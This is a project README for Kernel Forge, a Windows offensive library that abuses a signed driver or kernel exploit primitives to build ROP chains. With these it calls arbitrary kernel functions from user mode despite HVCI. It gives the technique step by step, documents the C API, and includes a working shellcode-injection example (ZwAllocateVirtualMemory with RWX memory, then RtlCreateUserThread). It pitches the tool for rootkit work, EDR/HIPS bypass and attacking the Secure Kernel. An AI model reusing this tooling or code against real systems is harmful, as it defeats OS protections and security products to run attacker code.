
# Kernel Forge library for Windows

[General information](#general-information)  
[Contents](#contents)  
[How does it work](#how-does-it-work)  
[Kernel Forge API](#kernel-forge-api)  
[Usage example](#usage-example)  
[Interfacing Secure Kernel with Kernel Forge](#interfacing-secure-kernel-with-kernel-forge)  

## General information

Today <a href="https://www.microsoft.com/en-us/windowsforbusiness/windows10-secured-core-computers">more and more Windows machines</a> comes with VBS enabled which forces kernel exploits and rootkits developers to accept new challenges. [Windows Virtualization-based Security (VBS)](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) uses hardware virtualization features and Hyper-V to host a number of security services, providing them with greatly increased protection from vulnerabilities in the operating system, and preventing the use of malicious exploits which attempt to defeat protections. One of the examples of such services is [Hypervisor-Enforced Code Integrity (HVCI)](https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity) which uses VBS to significantly strengthen code integrity policy enforcement.

 * **Q1:** On HVCI enabled target I can't execute my own kernel code anymore even with most awesome local privileges escalation kernel exploit that gives powerful arbitrary memory read write primitives.  

 * **A1:** You can use data only attack to overwrite process token, gain Local System and load any <a href="https://github.com/hfiref0x/KDU#currently-supported-providers">legitimate 3-rd party WHQL signed driver</a> that provides an access to I/O ports, physical memory and MSR registers.  

 * **Q2:** But what if I want to call an arbitrary kernel functions with arbitrary arguments?  

 * **A2:** That's why I made Kernel Forge library, it provides convenient API for this exact purpose.  

Kernel Forge consists from two main components: <a href="https://github.com/Cr4sh/KernelForge/blob/master/kforge_library/kforge_library.cpp">the first library</a> implements main functionality required to call an arbitrary kernel functions and <a href="https://github.com/Cr4sh/KernelForge/blob/master/kforge_driver/kforge_driver.cpp">the second library</a> used to delegate arbitrary memory read write primitives: it can be local privileges escalation exploit or just some wrapper around 3-rd party WHQL signed loldriver. For this project I'm using `WinIo.sys` variation that provides full physical memory access and works just fine even with enabled HVCI:

<img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/winio_signature.png" width="474" />


## Contents

Kernel Forge code base consists from the following files:

 * `kforge_driver/` &minus; Static library of `WinIo.sys` driver wrapper that provides memory read/write API.

 * `kforge_library/` &minus; Static library that implements main functionality of the Kernel Forge.

 * `kforge/` &minus; DLL version of the Kernel Forge library for its interfacing with different languages <a href="https://en.wikipedia.org/wiki/Foreign_function_interface">using CFFI</a>.

 * `include/kforge_driver.h` &minus; `kforge_driver.lib` program interface.

 * `include/kforge_library.h` &minus; `kforge_library.lib` program interface.

 * `kforge_example/` &minus; An example program that uses `kforge_library.lib` API to perform <a href="https://github.com/Cr4sh/s6_pcie_microblaze/blob/c13c744ddbc5b3e8dd89dde03ceaa3c7d0240f8e/python/payloads/DmaBackdoorHv/backdoor_client/vm_exec_kernel/vm_exec_kernel.cpp#L185">a classical</a> kernel mode to user mode DLL injection attack.

 * `dll_inject_shellcode.cpp`/`dll_inject_shellcode.h` &minus; Shellcode used by `kforge_example.exe` to handle injected DLL image imports and do other things.

 * `dummy/` &minus; Dummy DLL project to use with `kforge_example.exe` that shows message box after its injection into some process.


## How does it work

The idea behind Kernel Forge is very simple, there's no any innovative exploitation techniques, just common things already known for security researches but in more convenient form of the library to use it with 3-rd party projects.  

Many kernel mode payloads can be considered just as sequence of the function calls, but as long as we can't have any custom executable code in kernel space because of HVCI, Kernel Forge uses the following approach to perform such kernel function calls from user mode:

 1. Create new event object and new dummy thread that calls `WaitForSingleObject()` on this event to switch itself into the wait state. At this moment dummy thread call stack has the following look:

```
Child-SP          RetAddr           Call Site
fffff205`b0bfa660 fffff805`16265850 nt!KiSwapContext+0x76
fffff205`b0bfa7a0 fffff805`16264d7f nt!KiSwapThread+0x500
fffff205`b0bfa850 fffff805`16264623 nt!KiCommitThreadWait+0x14f
fffff205`b0bfa8f0 fffff805`1662cae1 nt!KeWaitForSingleObject+0x233
fffff205`b0bfa9e0 fffff805`1662cb8a nt!ObWaitForSingleObject+0x91
fffff205`b0bfaa40 fffff805`164074b5 nt!NtWaitForSingleObject+0x6a
fffff205`b0bfaa80 00007ffc`f882c6a4 nt!KiSystemServiceCopyEnd+0x25 (TrapFrame @ fffff205`b0bfaa80)
00000094`169ffce8 00007ffc`f630a34e ntdll!NtWaitForSingleObject+0x14
00000094`169ffcf0 00007ff6`66d72edd KERNELBASE!WaitForSingleObjectEx+0x8e
00000094`169ffd90 00000000`00000000 kforge_example!DummyThread+0xd
```

 2. Meanwhile, main thread uses `NtQuerySystemInformation()` native API function with `SystemHandleInformation` information class to find dummy thread `_KTHREAD` structure address.

 3. Arbitrary memory read primitive is used to obtain `StackBase` and `KernelStack` fields of `_KTHREAD` structure which describes dummy thread kernel stack location.

 4. Arbitrary memory read primitive is used to traverse dummy thread kernel stack starting from its bottom to locate return address from `nt!NtWaitForSingleObject()` back to the `nt!KiSystemServiceCopyEnd()`. 

 5. Then Kernel Forge <a gref="https://github.com/Cr4sh/KernelForge/blob/e4f5f10f474c9316776c6679e3347d8e8fe1bf0a/kforge_library/kforge_library.cpp#L583">constructs some ROP chain</a> to call desired kernel function with specified arguments, save its return value into the user mode memory and pass execution to `nt!ZwTerminateThread()` for graceful shutdown of dummy thread after the ROP chain execution. Arbitrary memory write primitive is used to overwrite previously located return address with an address of the first ROP gadget:

 <img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/rop_gadget.png" width="636" />

 6. And finally, Kernel Forge main thread sets event object to signaled state which resumes dummy thread and triggers ROP chain execution.

As you can see, it's pretty reliable things with no any magic involved. Of course, such approach has a plenty of obvious limitations:

 * You can't use Kernel Forge to call `nt!KeStackAttachProcess()` function that changes current process address space.

 * You only can execute your calls <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/managing-hardware-priorities">at passive IRQL level</a>.

 * You can't call any functions that registers kernel mode callbacks, like `nt!IoSetCompletionRoutine()`, `nt!
PsSetCreateProcessNotifyRoutine()` and others.

In addition, `kforge_driver.lib` is relying on `WinIo.sys` driver that provides an access only to the physical memory. To achieve virtual memory access having this we need to find PML4 page map location of the kernel virtual address space. Currently <a href="https://github.com/Cr4sh/KernelForge/blob/e4f5f10f474c9316776c6679e3347d8e8fe1bf0a/kforge_driver/kforge_driver.cpp#L60">I'm using</a> `PROCESSOR_START_BLOCK` structure scan approach to get PML4 address from one of its fields. However, `PROCESSOR_START_BLOCK` is not present on machines with legacy boot, but this fact doesn't looks like a practical limitation base on such machines you can't have HVCI support due to <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-requirements">its strict requirements</a>.

However, even with such limitations you still can develop pretty much useful kernel mode payloads for HVCI enabled targets. On the picture you can see `kforge_example.exe` utility that calls appropriate kernel functions with `kfroge_library.lib` API to perform DLL injection into the user mode process with `KernelMode` value of the `KPROCESSOR_MODE` which might be suitable for EDR/HIPS security products bypass:

<img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/kforge_example.png" width="762" />


## Kernel Forge API

Kernel Forge library provides the following C API:

```C++
/**
 * Initialize Kernel Forge library: reads kernel image into the user mode memory,
 * finds needed ROP gadgets, etc, etc.
 *
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfInit(void);
```

```C++
/**
 * Uninitialize Kernel Forge library when you don't need to use its API anymore.
 *
 * @return TRUE if success and FALSE in case of error.
 */
BOOL KfUninit(void);
```

```C++
/**
 * Call kernel function by its name, it can be exported ntoskrnl.exe function
 * or not exported Zw function.
 *
 * @param lpszProcName Name of the function to call.
 * @param Args Array with its arguments.
 * @param dwArgsCount Number of the arguments.
 * @param pRetVal Pointer to the variable that receives return value of the function.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfCall(char *lpszProcName, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal);
```

```C++
/**
 * Call an arbitrary function by its kernel address.
 *
 * @param ProcAddr Address of the function to call.
 * @param Args Array with its arguments.
 * @param dwArgsCount Number of the arguments.
 * @param pRetVal Pointer to the variable that receives return value of the function.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfCallAddr(PVOID ProcAddr, PVOID *Args, DWORD dwArgsCount, PVOID *pRetVal);
```

```C++
/**
 * Get system call number by appropriate ntdll native API function name.
 *
 * @param lpszProcName Name of the function.
 * @param pdwRet Pointer to the variable that receives system call number.
 * @return TRUE if success or FALSE in case of error.
 */
BOOL KfGetSyscallNumber(char *lpszProcName, PDWORD pdwRet);
```

```C++
/**
 * Get an actual kernel address of the function exported by ntoskrnl.exe image.
 *
 * @param lpszProcName Name of exported function.
 * @return Address of the function or NULL in case of error.
 */
PVOID KfGetKernelProcAddress(char *lpszProcName);
```

```C++
/**
 * Get an actual kernel address of not exported Zw function of ntoskrnl.exe image
 * using signature based search.
 *
 * @param lpszProcName Name of Zw function to search for.
 * @return Address of the function or NULL in case of error.
 */
PVOID KfGetKernelZwProcAddress(char *lpszProcName);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!ExAllocatePool() function to allocate
 * specified amount of non paged kernel heap memory.
 *
 * @param Size Number of bytes to allocate.
 * @return Kernel address of allocated memory or NULL in case of error.
 */
PVOID KfHeapAlloc(DWORD Size);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!ExAllocatePool() function to allocate
 * specified amount of non paged kernel heap memory and copy specified data from
 * the user mode into the allocated memory.
 *
 * @param Size Number of bytes to allocate.
 * @param Data Data to copy into the allocated memory.
 * @return Kernel address of allocated memory or NULL in case of error.
 */
PVOID KfHeapAllocData(DWORD Size, PVOID Data);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!ExFreePool() function to free the memory
 * that was allocated by KfHeapAlloc() or KfHeapAllocData() functions.
 *
 * @param Addr Address of the memory to free.
 */
void KfHeapFree(PVOID Addr);
```

```C++
/**
 * Wrapper that uses KfCall() to execute nt!memcpy() function to copy arbitrary data
 * between kernel mode and user mode or vice versa.
 *
 * @param Dst Address of the destination memory.
 * @param Src Address of the source memory.
 * @param Size Number of bytes to copy.
 * @return Destination memory address if success or NULL in case of error.
 */
PVOID KfMemCopy(PVOID Dst, PVOID Src, DWORD Size);
```

To use Kernel Forge with your own loldriver or kernel exploit you just need to implement a custom version of `kforge_driver.lib` library <a href="https://github.com/Cr4sh/KernelForge/blob/master/include/kforge_driver.h">with fairly simple program interface</a>.


## Usage example

Here you can see a bit simplified C code that uses Kernel Forge API to inject caller specified shellcode into the user mode process by its PID:

```C++
BOOL ShellcodeInject(HANDLE ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize)
{
    BOOL bRet = FALSE;
    DWORD_PTR Status = 0;
    HANDLE hProcess = NULL, hThread = NULL;    
    PVOID ShellcodeAddr = NULL;

    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjAttr;       

    InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    ClientId.UniqueProcess = ProcessId;
    ClientId.UniqueThread = NULL;

    // initialize Kernel Forge library
    if (!KfInit())
    {
        goto _end;
    }

    PVOID Args_1[] = { KF_ARG(&hProcess),                   // ProcessHandle
                       KF_ARG(PROCESS_ALL_ACCESS),          // DesiredAccess
                       KF_ARG(&ObjAttr),                    // ObjectAttributes
                       KF_ARG(&ClientId) };                 // ClientId

    // open the target process by its PID
    if (!KfCall("ZwOpenProcess", Args_1, 4, KF_RET(&Status)))
    {
        goto _end;
    }

    if (NT_ERROR(Status))
    {
        goto _end;
    }

    PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(&ShellcodeAddr),              // BaseAddress
                       KF_ARG(0),                           // ZeroBits
                       KF_ARG(&ShellcodeSize),              // RegionSize
                       KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
                       KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect

    // allocate memory for the shellcode
    if (!KfCall("ZwAllocateVirtualMemory", Args_2, 6, KF_RET(&Status)))
    {
        goto _end;
    }    

    if (NT_ERROR(Status))
    {
        goto _end;
    }

    PVOID Args_3[] = { KF_ARG(hProcess),                    // ProcessHandle    
                       KF_ARG(ShellcodeAddr),               // BaseAddress
                       KF_ARG(Shellcode),                   // Buffer
                       KF_ARG(ShellcodeSize),               // NumberOfBytesToWrite
                       KF_ARG(NULL) };                      // NumberOfBytesWritten

    // copy shellcode data into the allocated memory
    if (!KfCall("ZwWriteVirtualMemory", Args_3, 5, KF_RET(&Status)))
    {
        goto _end;
    }    

    if (NT_ERROR(Status))
    {
        goto _end;
    }

    PVOID Args_4[] = { KF_ARG(hProcess),                    // ProcessHandle
                       KF_ARG(NULL),                        // SecurityDescriptor
                       KF_ARG(FALSE),                       // CreateSuspended
                       KF_ARG(0),                           // StackZeroBits
                       KF_ARG(NULL),                        // StackReserved
                       KF_ARG(NULL),                        // StackCommit
                       KF_ARG(ShellcodeAddr),               // StartAddress 
                       KF_ARG(NULL),                        // StartParameter
                       KF_ARG(&hThread),                    // ThreadHandle
                       KF_ARG(&ClientId) };                 // ClientId

    // create new thread to execute the shellcode
    if (!KfCall("RtlCreateUserThread", Args_4, 10, KF_RET(&Status)))
    {
        goto _end;
    }    

    if (NT_SUCCESS(Status))
    {
        // shellcode was successfully injected
        bRet = TRUE;
    }

_end:

    // uninitialize Kernel Forge library
    KfUninit();

    return bRet;
}
```

For more complete example please refer to the `kforge_example.exe` <a href="https://github.com/Cr4sh/KernelForge/blob/master/kforge_example/kforge_example.cpp">source code</a>.


## Interfacing Secure Kernel with Kernel Forge

On VBS/HVCI enabled machines Hyper-V functionality is employed to logically divide the system into the two separate "worlds": normal world (VTL0) running the NT kernel that we’re all familiar with and isolated secure world (VTL1) running a Secure Kernel (SK). To learn more about VBS/HVCI internals I recommend you the following materials:

 * [Battle Of The SKM And IUM: How Windows 10 Rewrites OS Architecture](https://www.youtube.com/watch?v=LqaWIn4y26E) by [Alex Ionescu](https://twitter.com/aionescu)

 * [Live forensics on the Windows 10 secure kernel](https://www.semanticscholar.org/paper/Live-forensics-on-the-Windows-10-secure-kernel.-Brendmo/e275cc28c5c8e8e158c45e5e773d0fa3da01e118) by Hans Kristian Brendmo

 * [Work Package 6: Virtual Secure Mode](https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Cyber-Sicherheit/SiSyPHus/Workpackage6_Virtual_Secure_Mode.pdf?__blob=publicationFile&v=2) by [The BSI](https://www.bsi.bund.de/EN/TheBSI/thebsi_node.html)

To communicate with Secure Kernel a regular NT kernel uses special VTL0 to VTL1 Hyper-V hypercalls documented in [Hyper-V Hypervisor Top-Level Functional Specification](https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/tlfs) which are performed by `nt!HvlSwitchToVsmVtl1()` helper function. This not exported function is used by dozens of others not exported NT kernel functions to perform various actions, most of them has `Vsl` prefix:

<img src="https://raw.githubusercontent.com/Cr4sh/KernelForge/master/docs/images/vtl_kernel_functions.png" width="720" />

This set of `Vsl` functions exposes particularly interesting attack surface for fuzzing and exploitation of VTL1 and Secure Kernel isolated environment. Using Kernel Forge you can call this functions from user mode program without use of any complicated and not very convenient solutions <a href="https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv">like my Hyper-V backdoor</a>. To interact with Secure Kernel by calling `Vsl` functions of NT kernel it's more suitable to use `kforge.dll` from Python code with [ctypes library](https://docs.python.org/3/library/ctypes.html) as foreign functions interface and something like [pdbparse](https://github.com/moyix/pdbparse) to extract not exported kernel functions addresses from debug symbols.


## TODO

 * At this moment Kernel Forge has no support of chained calls, ie., single shot of the dummy thread can execute only one user specified kernel function. However, thread kernel stack has enough of free space for even more of ROP gadgets which allows to perform multiple calls as single sequence to use various kernel functions designed to work in pair (like `KeStackAttachProcess`/`KeUnstackDetachProcess`, `KeRaiseIrql`/`KeLowerIrql`, etc.) and overcome some of the limitations described above.


## Developed by

Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com<br/>
http://blog.cr4.sh<br/>
[@d_olex](http://twitter.com/d_olex)<br/>
